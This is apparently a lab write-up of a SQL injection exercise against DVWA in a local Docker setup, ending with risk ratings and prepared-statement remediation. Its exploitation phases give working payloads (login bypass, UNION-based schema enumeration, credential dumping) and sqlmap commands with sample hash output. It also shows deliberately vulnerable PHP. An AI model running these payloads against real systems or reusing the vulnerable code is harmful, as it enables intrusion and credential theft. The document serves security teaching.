# SQL Injection Attack on DVWA (Low Security)

## Table of Contents

1. Executive Summary
2. Project Objectives
3. Environment Setup
4. Understanding SQL Injection
5. Vulnerability Analysis
6. Manual Exploitation

   * Authentication Bypass
   * Vulnerability Verification
   * Column Enumeration
   * Database Enumeration
   * Table Enumeration
   * Column Enumeration
   * Credential Extraction
7. Automated Exploitation Using sqlmap
8. Findings
9. Risk Assessment
10. Remediation
11. Lessons Learned
12. Deliverables
13. Conclusion
14. Disclaimer
15. References

---

# Executive Summary

This project demonstrates the exploitation of a SQL Injection vulnerability in Damn Vulnerable Web Application (DVWA) configured with the **Low Security** setting. The assessment was performed in a controlled laboratory environment using Kali Linux and a locally hosted DVWA instance running inside Docker.

The purpose of this exercise was to understand how insecure handling of user-supplied input can allow attackers to manipulate SQL queries, bypass authentication mechanisms, enumerate database structures, and extract sensitive information.

The assessment covered the complete attack lifecycle, beginning with identifying the vulnerability and ending with automated exploitation using sqlmap. The exercise also explores mitigation techniques and secure coding practices that can effectively prevent SQL Injection attacks.

The findings demonstrate that even a single vulnerable input field can lead to complete compromise of a backend database when proper security controls are absent.

---

# Project Objectives

The primary objectives of this assessment were:

* Deploy DVWA in a controlled environment.
* Identify SQL Injection vulnerabilities.
* Perform authentication bypass.
* Verify database interaction through injected payloads.
* Enumerate databases, tables, and columns.
* Extract user credentials from the database.
* Automate exploitation using sqlmap.
* Analyze the security impact of the vulnerability.
* Implement and understand mitigation strategies.

---

# Environment Setup

## Test Environment

| Component               | Details           |
| ----------------------- | ----------------- |
| Attacker Machine        | Kali Linux        |
| Virtualization Platform | Oracle VirtualBox |
| Target Application      | DVWA              |
| Database Server         | MySQL             |
| Deployment Method       | Docker            |
| Security Configuration  | Low               |
| Attack Category         | SQL Injection     |

---

## DVWA Deployment

DVWA was deployed using the official Docker image.

```bash
sudo docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
```

After deployment:

1. Open a browser and navigate to:

```text
http://localhost:8080
```

2. Click **Create / Reset Database**.

3. Log in using the default credentials:

```text
Username: admin
Password: password
```

4. Navigate to **DVWA Security**.

5. Set the security level to:

```text
Low
```

The Low security setting intentionally disables input validation and other protections, making SQL Injection attacks possible.

---

# Understanding SQL Injection

SQL Injection is one of the most common and dangerous web application vulnerabilities.

It occurs when user input is directly incorporated into SQL queries without proper validation or parameterization.

When applications fail to distinguish between data and executable SQL commands, attackers can manipulate queries to gain unauthorized access to information.

Typical consequences include:

* Authentication bypass
* Database enumeration
* Data theft
* Data modification
* Data deletion
* Remote code execution (in some configurations)

---

# Vulnerability Analysis

The SQL Injection vulnerability exists because user input is directly concatenated into SQL statements.

Example vulnerable code:

```php
$id = $_GET['id'];

$query = "SELECT first_name, last_name
FROM users
WHERE user_id = '$id'";
```

In the above code:

* User input is stored in `$id`
* Input is inserted directly into the SQL query
* No filtering or validation is performed
* No prepared statements are used

Because the database interprets user input as part of the SQL command, attackers can manipulate query logic.

Example payload:

```text
1' OR '1'='1
```

Generated query:

```sql
SELECT first_name, last_name
FROM users
WHERE user_id='1' OR '1'='1'
```

Since the condition `'1'='1'` always evaluates to true, the query returns all available records.

---

# Manual Exploitation

## Phase 1 – Authentication Bypass

### Target

```text
http://localhost:8080/login.php
```

### Payload

Username:

```text
admin' --
```

Password:

```text
blank
```

---

### Original Query

```sql
SELECT *
FROM users
WHERE user='admin'
AND password=''
```

---

### Injected Query

```sql
SELECT *
FROM users
WHERE user='admin' -- '
AND password=''
```

---

### Explanation

The single quotation mark closes the original string.

The sequence:

```text
--
```

acts as a comment operator in MySQL.

Everything following the comment is ignored by the database.

As a result, the password verification logic is removed.

---

### Result

Successful login as the administrator account without knowing the password.

---

## Phase 2 – Vulnerability Verification

### Payload

```text
1'
```

---

### Generated Query

```sql
SELECT first_name,last_name
FROM users
WHERE user_id='1''
```

---

### Observation

The application displayed a MySQL syntax error.

---

### Analysis

This confirms:

* User input reaches the database.
* No input sanitization is performed.
* Error messages are exposed to users.
* SQL Injection is present.

---

## Phase 3 – Determining Column Count

To perform UNION-based attacks, the number of columns must match the original query.

### Payloads

```text
1' ORDER BY 1 #
```

```text
1' ORDER BY 2 #
```

```text
1' ORDER BY 3 #
```

---

### Results

| Payload    | Result  |
| ---------- | ------- |
| ORDER BY 1 | Success |
| ORDER BY 2 | Success |
| ORDER BY 3 | Error   |

---

### Conclusion

The original query returns exactly **2 columns**.

---

## Phase 4 – Database Enumeration

### Payload

```sql
-1' UNION SELECT 1,schema_name
FROM information_schema.schemata #
```

---

### Purpose

Retrieve all databases available on the MySQL server.

---

### Result

```text
information_schema
dvwa
mysql
performance_schema
```

---

### Analysis

The database named **dvwa** contains the application data and becomes the primary target for further enumeration.

---

## Phase 5 – Table Enumeration

### Payload

```sql
-1' UNION SELECT 1,table_name
FROM information_schema.tables
WHERE table_schema='dvwa' #
```

---

### Result

```text
guestbook
users
```

---

### Analysis

The users table is likely to contain account credentials and authentication-related information.

---

## Phase 6 – Column Enumeration

### Payload

```sql
-1' UNION SELECT 1,column_name
FROM information_schema.columns
WHERE table_schema='dvwa'
AND table_name='users' #
```

---

### Result

```text
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

---

### Analysis

The columns of greatest interest are:

```text
user
password
```

These fields contain usernames and password hashes.

---

## Phase 7 – Credential Extraction

### Payload

```sql
-1' UNION SELECT user,password
FROM dvwa.users #
```

---

### Result

```text
admin     | 5f4dcc3b5aa765d61d8327deb882cf99
gordonb   | e99a18c428cb38d5f260853678922e03
pablo     | 0d107d09f5bbe40cade3de5c71e9e9b7
smithy    | 5f4dcc3b5aa765d61d8327deb882cf99
```

---

### Analysis

The extracted password values are stored as MD5 hashes.

Example:

```text
5f4dcc3b5aa765d61d8327deb882cf99
```

Corresponds to:

```text
password
```

This demonstrates how attackers can obtain sensitive authentication data from vulnerable applications.

---

# Automated Exploitation Using sqlmap

After confirming the vulnerability manually, exploitation can be automated using sqlmap.

---

## Enumerating Databases

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<SESSION_ID>; security=low" \
--dbs
```

---

## Enumerating Tables

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<SESSION_ID>; security=low" \
-D dvwa --tables
```

---

## Dumping User Credentials

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<SESSION_ID>; security=low" \
-D dvwa -T users --dump
```

---

## Benefits of sqlmap

* Automatically detects injection points.
* Enumerates databases.
* Enumerates tables.
* Enumerates columns.
* Dumps sensitive data.
* Supports hash cracking.
* Reduces manual effort.

---

# Findings

The assessment confirmed that DVWA is critically vulnerable when configured with Low security settings.

Successfully extracted:

### Databases

* information_schema
* mysql
* performance_schema
* dvwa

### Tables

* guestbook
* users

### User Credentials

Multiple user accounts and password hashes were extracted successfully.

The attack required no authentication and no privileged access.

---

# Risk Assessment

| Category         | Impact   |
| ---------------- | -------- |
| Confidentiality  | High     |
| Integrity        | High     |
| Availability     | Medium   |
| Overall Severity | Critical |

---

## Confidentiality Impact

Attackers can access sensitive information including usernames, password hashes, and potentially confidential business data.

---

## Integrity Impact

Attackers may alter, insert, or delete records from the database.

---

## Availability Impact

Malicious queries can disrupt application functionality and affect database availability.

---

## Overall Severity

Critical.

The vulnerability allows unauthorized users to gain access to sensitive information and potentially compromise the entire database.

---

# Remediation

The most effective protection against SQL Injection is the use of prepared statements.

---

## Vulnerable Code

```php
$id = $_GET['id'];

$query = "SELECT first_name,last_name
FROM users
WHERE user_id='$id'";
```

---

## Secure Code

```php
$stmt = $conn->prepare(
"SELECT first_name,last_name
FROM users
WHERE user_id=?"
);

$stmt->bind_param("i",$id);
$stmt->execute();
```

---

## Additional Security Measures

### Input Validation

Accept only expected input formats.

### Least Privilege

Restrict database account permissions.

### Error Handling

Do not expose SQL errors to users.

### Web Application Firewall

Deploy a WAF capable of detecting malicious requests.

### Security Testing

Conduct regular vulnerability assessments and penetration testing.

---

# Lessons Learned

This exercise demonstrated how dangerous insecure database interactions can be.

Key takeaways:

* User input should never be trusted.
* Error messages assist attackers.
* SQL Injection remains a serious threat.
* Prepared statements are essential.
* Security must be integrated into development from the beginning.
* Automated tools can rapidly exploit vulnerable applications.

---

# Conclusion

This assessment successfully demonstrated the exploitation of a SQL Injection vulnerability within DVWA running at the Low security level. Through a combination of manual testing and automated tools, it was possible to bypass authentication mechanisms, enumerate database structures, and extract sensitive credential information.

The exercise highlights the importance of secure coding practices and reinforces why parameterized queries, proper input validation, and secure error handling should be considered mandatory controls in modern web applications.

---

# Disclaimer

This assessment was conducted exclusively within an authorized laboratory environment using DVWA running locally on a personal machine. The techniques described in this report are intended solely for educational, research, and defensive security purposes. Unauthorized testing against systems without explicit permission may violate legal and ethical guidelines.

---

# References

1. OWASP SQL Injection Prevention Cheat Sheet
2. OWASP Testing Guide
3. DVWA Documentation
4. PortSwigger Web Security Academy
5. MySQL Information Schema Documentation
6. sqlmap Official Documentation
